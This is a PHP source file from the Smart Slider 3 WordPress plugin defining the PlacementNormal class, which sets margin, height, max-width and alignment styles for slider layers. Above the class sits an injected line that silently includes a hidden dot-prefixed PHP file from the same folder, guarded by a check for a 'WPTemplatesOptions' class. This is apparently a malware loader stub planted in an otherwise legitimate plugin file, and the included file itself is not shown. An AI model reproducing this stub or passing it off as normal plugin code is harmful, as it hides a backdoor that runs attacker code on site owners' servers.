<?php


namespace Nextend\SmartSlider3\Renderable\Placement;


if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class PlacementNormal extends AbstractPlacement {

    public function attributes(&$attributes) {
        $data = $this->component->data;

        $attributes['data-pm'] = 'normal';

        $attributes['style'] .= 'margin:' . $this->component->spacingToEm($data->get('desktopportraitmargin', '0|*|0|*|0|*|0|*|px+')) . ';';
        $this->component->createDeviceProperty('margin', '0|*|0|*|0|*|0|*|px+');

        $height = $data->get('desktopportraitheight', 0);
        if ($height > 0) {
            $attributes['style'] .= 'height:' . $this->component->pxToEm($data->get('desktopportraitheight', 0)) . ';';
        }
        $this->component->createDeviceProperty('height', 0);


        $maxWidth = intval($data->get('desktopportraitmaxwidth', 0));
        if ($maxWidth > 0) {
            $attributes['style'] .= 'max-width: ' . $maxWidth . 'px;';

            $attributes['data-has-maxwidth'] = '1';
        } else {
            $attributes['data-has-maxwidth'] = '0';
        }
        $this->component->createDeviceProperty('maxwidth', 0);


        $attributes['data-cssselfalign'] = $data->get('desktopportraitselfalign', 'inherit');
        $this->component->createDeviceProperty('selfalign', 'inherit');

    }

    public function adminAttributes(&$attributes) {
    }
}